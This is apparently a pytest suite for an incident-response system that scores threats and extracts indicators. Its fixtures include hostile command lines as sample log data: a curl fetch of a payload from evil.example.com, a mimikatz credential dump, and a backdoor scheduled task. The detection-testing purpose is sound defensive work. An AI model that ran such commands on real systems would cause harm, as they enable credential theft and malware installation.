"""
Comprehensive tests for IR-Agent — second batch.

Covers:
  - ThreatAssessmentEngine (scoring, arbitration, confidence, explanation)
  - IncidentManager IoC extraction
  - IncidentManager root cause analysis
  - IncidentManager impact assessment
  - IncidentManager recommendations
  - IncidentManager misc (list_incidents, get_stats, report sections)
  - GetIncidentEventsTool edge cases
"""

import os
import sys
import types
import pytest
from unittest.mock import MagicMock

os.environ.setdefault("ENVIRONMENT",               "testing")
os.environ.setdefault("LLM_API_KEY",               "")
os.environ.setdefault("MY_API_TOKEN",              "")
os.environ.setdefault("BETTER_STACK_SOURCE_TOKEN", "")
os.environ.setdefault("CORS_ORIGINS",              "*")

# ── Stub heavy ML deps ────────────────────────────────────────────────────────

def _stub(name: str) -> types.ModuleType:
    m = types.ModuleType(name)
    sys.modules[name] = m
    return m

for _dep in ("faiss", "sentence_transformers", "torch", "sklearn",
             "sklearn.ensemble", "sklearn.calibration"):
    if _dep not in sys.modules:
        _stub(_dep)

if "faiss" in sys.modules:
    sys.modules["faiss"].IndexFlatIP = MagicMock
    sys.modules["faiss"].read_index  = MagicMock(return_value=MagicMock())
    sys.modules["faiss"].write_index = MagicMock()
if "sentence_transformers" in sys.modules:
    sys.modules["sentence_transformers"].SentenceTransformer = MagicMock


# ── Shared fixtures ───────────────────────────────────────────────────────────

@pytest.fixture()
def manager():
    from app.services.incident_manager import IncidentManager
    return IncidentManager()


@pytest.fixture()
def engine():
    from app.assessment.threat_assessment import ThreatAssessmentEngine
    return ThreatAssessmentEngine()


# ═══════════════════════════════════════════════════════════════════════════════
# ThreatAssessmentEngine
# ═══════════════════════════════════════════════════════════════════════════════

class TestThreatAssessmentEngine:

    def test_ml_only_score_proportional(self, engine):
        """ML score of 0.9 with no other signals should give high final score."""
        from app.assessment.threat_assessment import MLSignal
        a = engine.assess(ml=MLSignal(score=0.9, is_malicious=True, reason="test"))
        assert a.final_score >= 60, "ML 0.9 alone should yield meaningful threat score"

    def test_ml_only_low_score_info(self, engine):
        """ML score 0.1 alone should give INFO severity."""
        from app.assessment.threat_assessment import MLSignal, ThreatSeverity
        a = engine.assess(ml=MLSignal(score=0.1, is_malicious=False, reason="benign"))
        assert a.severity in (ThreatSeverity.INFO, ThreatSeverity.LOW)

    def test_heuristic_penalty_applied(self, engine):
        """model_loaded=False applies 0.7x penalty to ML score."""
        from app.assessment.threat_assessment import MLSignal
        full  = engine.assess(ml=MLSignal(score=0.8, is_malicious=True, model_loaded=True))
        heur  = engine.assess(ml=MLSignal(score=0.8, is_malicious=True, model_loaded=False))
        assert heur.final_score < full.final_score

    def test_r1_two_ioc_providers_forces_critical(self, engine):
        """R1: ≥2 IoC providers confirmed malicious → score ≥85 (CRITICAL)."""
        from app.assessment.threat_assessment import (
            MLSignal, IoCSignal, ThreatSeverity
        )
        a = engine.assess(
            ml=MLSignal(score=0.5, is_malicious=True),
            ioc=IoCSignal(score=0.8, is_malicious=True,
                          providers_hit=["VirusTotal", "AbuseIPDB"], indicator_count=2),
        )
        assert a.severity == ThreatSeverity.CRITICAL
        assert any("R1" in r for r in a.arbitration_rules_fired)

    def test_r2_credential_dump_ml_reason_escalates(self, engine):
        """R2: 'lsass' in ML reason forces score ≥80."""
        from app.assessment.threat_assessment import MLSignal
        a = engine.assess(
            ml=MLSignal(score=0.4, is_malicious=True, reason="lsass dump detected")
        )
        assert a.final_score >= 80
        assert any("R2" in r for r in a.arbitration_rules_fired)

    def test_r3_lateral_plus_credential_forces_high(self, engine):
        """R3: lateral_movement + credential_access combo → score ≥65."""
        from app.assessment.threat_assessment import MLSignal, MITRESignal, ThreatSeverity
        a = engine.assess(
            ml=MLSignal(score=0.3, is_malicious=False),
            mitre=MITRESignal(
                techniques=[{"id": "T1570", "name": "Lateral Tool Transfer", "confidence": 0.8}],
                tactic_coverage=["Lateral Movement", "Credential Access"],
                max_confidence=0.8,
                has_lateral_movement=True,
                has_credential_access=True,
            ),
        )
        assert a.final_score >= 65
        assert any("R3" in r for r in a.arbitration_rules_fired)

    def test_r6_false_positive_downgrade(self, engine):
        """R6: Agent HIGH_CONFIDENCE FALSE_POSITIVE + ML < 0.6 → score capped at 25."""
        from app.assessment.threat_assessment import MLSignal, AgentSignal
        a = engine.assess(
            ml=MLSignal(score=0.4, is_malicious=True),
            agent=AgentSignal(verdict="FALSE_POSITIVE", confidence=0.9),
        )
        assert a.final_score <= 25
        assert any("R6" in r for r in a.arbitration_rules_fired)

    def test_r5_all_sources_agree_bonus(self, engine):
        """R5: all sources vote malicious → score gets a bonus."""
        from app.assessment.threat_assessment import MLSignal, IoCSignal, AgentSignal
        no_bonus = engine.assess(
            ml=MLSignal(score=0.7, is_malicious=True),
        )
        with_bonus = engine.assess(
            ml=MLSignal(score=0.7, is_malicious=True),
            ioc=IoCSignal(score=0.7, is_malicious=True, providers_hit=["VT"]),
            agent=AgentSignal(verdict="MALICIOUS", confidence=0.8),
        )
        assert with_bonus.final_score > no_bonus.final_score

    def test_score_bounded_0_to_100(self, engine):
        """Final score must never exceed 100."""
        from app.assessment.threat_assessment import (
            MLSignal, IoCSignal, MITRESignal, AgentSignal
        )
        a = engine.assess(
            ml=MLSignal(score=1.0, is_malicious=True, reason="lsass dump"),
            ioc=IoCSignal(score=1.0, is_malicious=True,
                          providers_hit=["VirusTotal", "AbuseIPDB"], indicator_count=5),
            mitre=MITRESignal(
                techniques=[{"id": "T1003", "name": "OS Cred Dumping", "confidence": 0.9}],
                tactic_coverage=["Credential Access", "Lateral Movement"],
                max_confidence=0.9,
                has_credential_access=True,
                has_lateral_movement=True,
                has_impact=True,
            ),
            agent=AgentSignal(verdict="MALICIOUS", confidence=1.0, reasoning_steps=6),
        )
        assert 0 <= a.final_score <= 100

    def test_explanation_not_empty(self, engine):
        """assess() must always produce a non-empty explanation."""
        from app.assessment.threat_assessment import MLSignal
        a = engine.assess(ml=MLSignal(score=0.5, is_malicious=True))
        assert a.explanation.strip() != ""

    def test_to_dict_structure(self, engine):
        """to_dict() must include all required keys."""
        from app.assessment.threat_assessment import MLSignal
        a = engine.assess(ml=MLSignal(score=0.6, is_malicious=True)).to_dict()
        for key in ("final_score", "severity", "confidence_level",
                    "score_breakdown", "explanation", "recommended_action"):
            assert key in a

    def test_no_signals_returns_info(self, engine):
        """assess() with zero signals should return INFO severity."""
        from app.assessment.threat_assessment import ThreatSeverity
        a = engine.assess()
        assert a.severity == ThreatSeverity.INFO
        assert a.final_score == 0.0

    def test_agent_suspicious_adds_partial_score(self, engine):
        """SUSPICIOUS verdict (0.6) should add partial score, less than MALICIOUS."""
        from app.assessment.threat_assessment import AgentSignal
        susp = engine.assess(agent=AgentSignal(verdict="SUSPICIOUS",  confidence=0.8))
        mal  = engine.assess(agent=AgentSignal(verdict="MALICIOUS",   confidence=0.8))
        assert susp.final_score < mal.final_score
        assert susp.final_score > 0

    def test_confidence_high_when_three_sources_agree(self, engine):
        """ConfidenceLevel.HIGH requires ≥3 sources agreeing."""
        from app.assessment.threat_assessment import (
            MLSignal, IoCSignal, AgentSignal, ConfidenceLevel
        )
        a = engine.assess(
            ml=MLSignal(score=0.8, is_malicious=True),
            ioc=IoCSignal(score=0.8, is_malicious=True, providers_hit=["VT"]),
            agent=AgentSignal(verdict="MALICIOUS", confidence=0.8),
        )
        assert a.confidence_level == ConfidenceLevel.HIGH

    def test_recommended_action_not_empty(self, engine):
        """Every assessment should have a non-empty recommended_action."""
        from app.assessment.threat_assessment import MLSignal
        a = engine.assess(ml=MLSignal(score=0.9, is_malicious=True, reason="lsass dump"))
        assert a.recommended_action.strip() != ""

    def test_severity_from_score_thresholds(self):
        """ThreatSeverity.from_score() must match documented thresholds."""
        from app.assessment.threat_assessment import ThreatSeverity
        assert ThreatSeverity.from_score(90) == ThreatSeverity.CRITICAL
        assert ThreatSeverity.from_score(65) == ThreatSeverity.HIGH
        assert ThreatSeverity.from_score(45) == ThreatSeverity.MEDIUM
        assert ThreatSeverity.from_score(25) == ThreatSeverity.LOW
        assert ThreatSeverity.from_score(24) == ThreatSeverity.INFO


# ═══════════════════════════════════════════════════════════════════════════════
# IncidentManager — IoC extraction
# ═══════════════════════════════════════════════════════════════════════════════

class TestIncidentIoCExtraction:

    def _investigated(self, manager, event, confidence=0.9):
        inc_id = manager.correlate_event(event, confidence, "r")
        manager.investigate(inc_id)
        return manager._incidents[inc_id]

    def test_external_ip_extracted(self, manager):
        """External IP in source_ip field should be extracted as IoC."""
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4625,
              "hostname": "WS-01", "source_ip": "185.220.101.5", "user": "admin"}
        inc = self._investigated(manager, ev)
        ip_iocs = [i for i in inc.iocs if i.type == "ip"]
        assert any("185.220.101.5" in i.value for i in ip_iocs)

    def test_private_ip_filtered(self, manager):
        """Private IP (10.x / 192.168.x) must NOT appear as IoC."""
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4688,
              "hostname": "WS-01", "source_ip": "10.0.0.5",
              "command_line": "net use \\\\10.0.0.5\\share"}
        inc = self._investigated(manager, ev)
        ip_iocs = [i for i in inc.iocs if i.type == "ip"]
        assert not any(i.value.startswith("10.") for i in ip_iocs)

    def test_sha256_hash_extracted(self, manager):
        """SHA-256 hash in command_line should be extracted as IoC."""
        sha = "a" * 64
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4688,
              "hostname": "WS-01",
              "command_line": f"verify hash {sha}"}
        inc = self._investigated(manager, ev)
        hash_iocs = [i for i in inc.iocs if i.type == "sha256"]
        assert any(sha in i.value for i in hash_iocs)

    def test_url_extracted(self, manager):
        """URL in command_line should be extracted as IoC."""
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4688,
              "hostname": "WS-01",
              "command_line": "curl http://evil.example.com/payload.exe"}
        inc = self._investigated(manager, ev)
        url_iocs = [i for i in inc.iocs if i.type == "url"]
        assert len(url_iocs) >= 1

    def test_mimikatz_process_as_ioc(self, manager):
        """mimikatz.exe as process_name should generate a 'process' IoC."""
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4688,
              "hostname": "WS-01", "process_name": "mimikatz.exe",
              "command_line": "sekurlsa::logonpasswords"}
        inc = self._investigated(manager, ev)
        proc_iocs = [i for i in inc.iocs if i.type == "process"]
        assert any("mimikatz" in i.value.lower() for i in proc_iocs)

    def test_ioc_deduplication(self, manager):
        """Same IP in two events must appear only once in incident.iocs."""
        ev1 = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4625,
               "hostname": "WS-01", "source_ip": "185.220.101.5"}
        ev2 = {"timestamp": "2026-04-27T10:01:00Z", "event_id": 4625,
               "hostname": "WS-01", "source_ip": "185.220.101.5"}
        inc_id = manager.correlate_event(ev1, 0.8, "r")
        manager.correlate_event(ev2, 0.8, "r")
        manager.investigate(inc_id)
        inc = manager._incidents[inc_id]
        ip_values = [i.value for i in inc.iocs if i.type == "ip"]
        assert ip_values.count("185.220.101.5") == 1


# ═══════════════════════════════════════════════════════════════════════════════
# IncidentManager — root cause analysis
# ═══════════════════════════════════════════════════════════════════════════════

class TestIncidentRootCause:

    def _investigated(self, manager, *events):
        inc_id = None
        for i, ev in enumerate(events):
            if i == 0:
                inc_id = manager.correlate_event(ev, 0.9, "r")
            else:
                manager.correlate_event(ev, 0.85, "r")
        manager.investigate(inc_id)
        return manager._incidents[inc_id]

    def test_brute_force_root_cause(self, manager):
        """4625 (logon failure) events → brute force in root cause."""
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4625,
              "hostname": "DC-01", "event_type": "logon_failure", "user": "admin"}
        inc = self._investigated(manager, ev)
        assert "brute force" in inc.root_cause.lower()

    def test_rdp_root_cause(self, manager):
        """4624 with logon_type=10 → RDP in root cause."""
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4624,
              "hostname": "WS-01", "logon_type": 10, "user": "admin"}
        inc = self._investigated(manager, ev)
        assert "rdp" in inc.root_cause.lower()

    def test_powershell_root_cause(self, manager):
        """PowerShell as first event → phishing/exploit cause."""
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4688,
              "hostname": "WS-01", "process_name": "powershell.exe",
              "command_line": "invoke-expression payload"}
        inc = self._investigated(manager, ev)
        assert "powershell" in inc.root_cause.lower()

    def test_execution_then_persistence_root_cause(self, manager):
        """Execution followed by persistence → 'persistence after execution' mention."""
        ev1 = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4688,
               "hostname": "WS-01", "process_name": "powershell.exe",
               "command_line": "invoke-expression payload"}
        ev2 = {"timestamp": "2026-04-27T10:01:00Z", "event_id": 4698,
               "hostname": "WS-01", "user": "admin",
               "command_line": "schtasks /create /tn backdoor /tr payload.exe"}
        inc = self._investigated(manager, ev1, ev2)
        assert "persistence" in inc.root_cause.lower()

    def test_credential_access_in_root_cause(self, manager):
        """Mimikatz event → credential harvesting mentioned in root cause."""
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4688,
              "hostname": "WS-01", "process_name": "mimikatz.exe",
              "command_line": "sekurlsa::logonpasswords"}
        inc = self._investigated(manager, ev)
        assert "credential" in inc.root_cause.lower()


# ═══════════════════════════════════════════════════════════════════════════════
# IncidentManager — impact assessment
# ═══════════════════════════════════════════════════════════════════════════════

class TestIncidentImpact:

    def _investigated(self, manager, event, confidence=0.9):
        inc_id = manager.correlate_event(event, confidence, "r")
        manager.investigate(inc_id)
        return manager._incidents[inc_id]

    def test_credential_access_impact(self, manager):
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4688,
              "hostname": "WS-01", "process_name": "mimikatz.exe",
              "command_line": "sekurlsa::logonpasswords"}
        inc = self._investigated(manager, ev)
        assert "credential" in inc.impact_assessment.lower()

    def test_persistence_impact(self, manager):
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4698,
              "hostname": "WS-01", "user": "admin",
              "command_line": "schtasks /create /tn evil /tr payload.exe"}
        inc = self._investigated(manager, ev)
        assert "persistence" in inc.impact_assessment.lower()

    def test_c2_impact(self, manager):
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4688,
              "hostname": "WS-01", "process_name": "beacon.exe",
              "command_line": "cobalt strike reverse beacon 4444"}
        inc = self._investigated(manager, ev)
        assert "c2" in inc.impact_assessment.lower()

    def test_limited_impact_fallback(self, manager):
        """Unknown event type → 'limited impact' fallback message."""
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4625,
              "hostname": "WS-01", "user": "bob", "event_type": "logon_failure",
              "source_ip": "10.0.0.1"}
        inc = self._investigated(manager, ev)
        assert inc.impact_assessment != ""


# ═══════════════════════════════════════════════════════════════════════════════
# IncidentManager — recommendations
# ═══════════════════════════════════════════════════════════════════════════════

class TestIncidentRecommendations:

    def _investigated(self, manager, *events):
        inc_id = None
        for i, ev in enumerate(events):
            if i == 0:
                inc_id = manager.correlate_event(ev, 0.9, "r")
            else:
                manager.correlate_event(ev, 0.85, "r")
        manager.investigate(inc_id)
        return manager._incidents[inc_id]

    def test_isolate_always_first(self, manager):
        """'Isolate' must appear in recommendations regardless of incident type."""
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4688,
              "hostname": "WS-01", "process_name": "powershell.exe",
              "command_line": "invoke-expression x"}
        inc = self._investigated(manager, ev)
        assert any("isolate" in r.lower() for r in inc.recommendations)

    def test_credential_reset_rec(self, manager):
        """Credential access → password reset recommendation."""
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4688,
              "hostname": "WS-01", "process_name": "mimikatz.exe",
              "command_line": "sekurlsa::logonpasswords"}
        inc = self._investigated(manager, ev)
        assert any("credential" in r.lower() or "password" in r.lower()
                   for r in inc.recommendations)

    def test_block_ips_rec_when_external_ioc(self, manager):
        """External IP in IoCs → block IP recommendation."""
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4625,
              "hostname": "WS-01", "source_ip": "185.220.101.5", "user": "admin"}
        inc = self._investigated(manager, ev)
        assert any("block" in r.lower() or "185.220" in r
                   for r in inc.recommendations)

    def test_persistence_removal_rec(self, manager):
        """Persistence phase → remove persistence mechanisms recommendation."""
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4698,
              "hostname": "WS-01", "user": "admin",
              "command_line": "schtasks /create /tn evil /tr payload.exe"}
        inc = self._investigated(manager, ev)
        assert any("persistence" in r.lower() or "scheduled task" in r.lower()
                   for r in inc.recommendations)

    def test_evidence_preservation_always_present(self, manager):
        """'evidence' or 'forensic' must always appear in recommendations."""
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4688,
              "hostname": "WS-01", "process_name": "powershell.exe",
              "command_line": "whoami"}
        inc = self._investigated(manager, ev)
        assert any("evidence" in r.lower() or "forensic" in r.lower()
                   for r in inc.recommendations)


# ═══════════════════════════════════════════════════════════════════════════════
# IncidentManager — misc methods
# ═══════════════════════════════════════════════════════════════════════════════

class TestIncidentManagerMisc:

    def test_list_incidents_format(self, manager):
        """list_incidents() returns list of dicts with expected keys."""
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4688,
              "hostname": "WS-01", "process_name": "powershell.exe"}
        manager.correlate_event(ev, 0.9, "r")
        listing = manager.list_incidents()
        assert len(listing) == 1
        for key in ("id", "host", "severity", "classification", "event_count", "status"):
            assert key in listing[0]

    def test_get_stats_counts(self, manager):
        """get_stats() reports correct incident and event totals."""
        ev1 = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4688,
               "hostname": "WS-01", "process_name": "ps.exe"}
        ev2 = {"timestamp": "2026-04-27T10:01:00Z", "event_id": 4688,
               "hostname": "WS-01", "process_name": "cmd.exe"}
        manager.correlate_event(ev1, 0.9, "r")
        manager.correlate_event(ev2, 0.8, "r")
        stats = manager.get_stats()
        assert stats["total_incidents"] == 1
        assert stats["total_events_correlated"] == 2

    def test_report_contains_timeline_section(self, manager):
        """get_report() output must contain 'ATTACK TIMELINE' header."""
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4688,
              "hostname": "WS-01", "process_name": "powershell.exe",
              "command_line": "invoke-mimikatz"}
        inc_id = manager.correlate_event(ev, 0.9, "r")
        manager.investigate(inc_id)
        report = manager.get_report(inc_id)
        assert "ATTACK TIMELINE" in report

    def test_report_contains_root_cause_section(self, manager):
        """get_report() must contain 'ROOT CAUSE ANALYSIS' header."""
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4625,
              "hostname": "DC-01", "user": "admin", "event_type": "logon_failure"}
        inc_id = manager.correlate_event(ev, 0.8, "r")
        manager.investigate(inc_id)
        report = manager.get_report(inc_id)
        assert "ROOT CAUSE ANALYSIS" in report

    def test_get_report_none_for_unknown(self, manager):
        """get_report() returns None for unknown incident ID."""
        assert manager.get_report("IR-00000000-INVALID") is None

    def test_different_hosts_two_incidents(self, manager):
        """Events from two different hosts should create two separate incidents."""
        ev1 = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4688,
               "hostname": "HOST-A", "process_name": "ps.exe"}
        ev2 = {"timestamp": "2026-04-27T10:00:01Z", "event_id": 4688,
               "hostname": "HOST-B", "process_name": "ps.exe"}
        id1 = manager.correlate_event(ev1, 0.9, "r")
        id2 = manager.correlate_event(ev2, 0.8, "r")
        assert id1 != id2
        assert manager.get_stats()["total_incidents"] == 2

    def test_key_findings_generated_after_investigate(self, manager):
        """investigate() must populate key_findings list."""
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4688,
              "hostname": "WS-01", "process_name": "mimikatz.exe",
              "command_line": "sekurlsa::logonpasswords"}
        inc_id = manager.correlate_event(ev, 0.9, "r")
        result = manager.investigate(inc_id)
        assert len(result["key_findings"]) >= 1


# ═══════════════════════════════════════════════════════════════════════════════
# GetIncidentEventsTool — edge cases
# ═══════════════════════════════════════════════════════════════════════════════

class TestGetIncidentEventsToolEdgeCases:

    def test_unknown_incident_returns_error(self, manager):
        from app.agent.tools.get_incident_events import GetIncidentEventsTool
        tool   = GetIncidentEventsTool(manager)
        result = tool.execute(incident_id="IR-00000000-NOPE")
        assert not result.success
        assert "not found" in (result.error or "").lower()

    def test_no_manager_returns_error(self):
        from app.agent.tools.get_incident_events import GetIncidentEventsTool
        tool   = GetIncidentEventsTool(None)
        result = tool.execute(incident_id="IR-X")
        assert not result.success

    def test_limit_max_50_enforced(self, manager):
        """Requesting limit=200 must be capped to 50."""
        from app.agent.tools.get_incident_events import GetIncidentEventsTool
        ev = {"timestamp": "2026-04-27T10:00:00Z", "event_id": 4688,
              "hostname": "WS-01", "process_name": "ps.exe"}
        inc_id = manager.correlate_event(ev, 0.9, "r")
        tool   = GetIncidentEventsTool(manager)
        result = tool.execute(incident_id=inc_id, limit=200)
        assert result.success
        assert result.data["count"] <= 50
